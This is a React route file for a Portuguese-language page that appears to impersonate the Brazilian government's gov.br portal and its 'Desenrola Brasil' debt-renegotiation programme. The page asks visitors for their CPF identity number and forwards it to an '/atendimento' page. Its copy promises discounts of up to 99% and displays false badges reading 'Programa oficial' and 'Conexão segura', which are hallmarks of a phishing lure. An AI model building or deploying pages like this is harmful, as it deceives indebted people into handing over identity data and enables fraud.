import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState, type FormEvent } from "react";

export const Route = createFileRoute("/cpf")({
  head: () => ({
    meta: [
      { title: "Informe seu CPF — Desenrola Brasil" },
      {
        name: "description",
        content:
          "Informe seu CPF e clique em Continuar para renegociar suas dívidas com descontos de até 99% pelo Programa Desenrola Brasil.",
      },
      { property: "og:title", content: "Informe seu CPF — Desenrola Brasil" },
      {
        property: "og:description",
        content: "Consulte pelo CPF e renegocie suas dívidas com descontos de até 99%.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: CpfPage,
});

function formatCpf(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 11);
  return digits
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
    .replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, "$1.$2.$3-$4");
}

function isValidCpf(value: string) {
  const cpf = value.replace(/\D/g, "");
  if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
  let sum = 0;
  for (let i = 0; i < 9; i++) sum += Number(cpf[i]) * (10 - i);
  let d1 = (sum * 10) % 11;
  if (d1 === 10) d1 = 0;
  if (d1 !== Number(cpf[9])) return false;
  sum = 0;
  for (let i = 0; i < 10; i++) sum += Number(cpf[i]) * (11 - i);
  let d2 = (sum * 10) % 11;
  if (d2 === 10) d2 = 0;
  return d2 === Number(cpf[10]);
}

function CpfPage() {
  const navigate = useNavigate();
  const [cpf, setCpf] = useState("");
  const [error, setError] = useState(false);

  function handleSubmit(e: FormEvent) {
    e.preventDefault();
    if (!isValidCpf(cpf)) {
      setError(true);
      return;
    }
    setError(false);
    navigate({ to: "/atendimento", search: { cpf: cpf.replace(/\D/g, "") } });
  }

  return (
    <div className="min-h-screen bg-muted">
      <div className="mx-auto w-full max-w-[520px] bg-card">
        <header className="flex items-center justify-between border-b border-border px-5 py-3">
          <img src="/images/logo-portal.png" alt="gov.br" className="h-6 w-auto" />
        </header>

        <main className="px-5 pb-8 pt-6">
          <img
            src="/images/programa-logo.png"
            alt="Limpe seu Nome e Desenrola Brasil"
            className="mx-auto h-28 w-auto"
          />

          <div className="mt-6 border-l-4 border-accent bg-accent/10 px-4 py-3 text-sm leading-relaxed text-foreground">
            ✅ <strong>ATUALIZADO</strong> - Informe seu CPF e clique em "Continuar" para renegociar
            suas dívidas com descontos de 99%
          </div>

          <form onSubmit={handleSubmit} className="mt-6">
            <label htmlFor="cpf" className="block text-sm font-bold text-foreground">
              CPF
            </label>
            <input
              id="cpf"
              inputMode="numeric"
              autoComplete="off"
              placeholder="000.000.000-00"
              value={cpf}
              onChange={(e) => {
                setCpf(formatCpf(e.target.value));
                setError(false);
              }}
              className="mt-2 w-full rounded-lg border border-input bg-background px-4 py-3 text-lg text-foreground outline-none focus:border-primary focus:ring-2 focus:ring-ring/30"
            />
            {error && (
              <p className="mt-2 text-sm font-medium text-destructive">
                CPF inválido. Verifique e tente novamente.
              </p>
            )}

            <button
              type="submit"
              className="mt-5 w-full rounded-full bg-primary px-6 py-4 text-lg font-bold text-primary-foreground transition-colors hover:bg-primary/90"
            >
              Continuar
            </button>
          </form>

          <div className="mt-6 rounded-lg bg-secondary px-4 py-4 text-sm leading-relaxed text-foreground">
            ℹ️ O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de
            crédito imediata!
          </div>

          <div className="mt-6 flex justify-center gap-6 text-xs text-foreground">
            <span>🔒 Conexão segura</span>
            <span>🛡️ Programa oficial</span>
          </div>
          <p className="mt-3 text-center text-xs text-muted-foreground">
            Sistema de Renegociação — Todos os direitos reservados
          </p>
        </main>
      </div>

      <footer className="mx-auto w-full max-w-[520px] bg-primary px-6 py-8 text-primary-foreground">
        <p className="text-xl font-bold">gov.br</p>
        <p className="mt-3 text-xs">Todo o conteúdo deste site está publicado sob a licença</p>
        <p className="mt-1 text-xs font-bold">
          Sistema de Renegociação — Todos os direitos reservados
        </p>
      </footer>
    </div>
  );
}
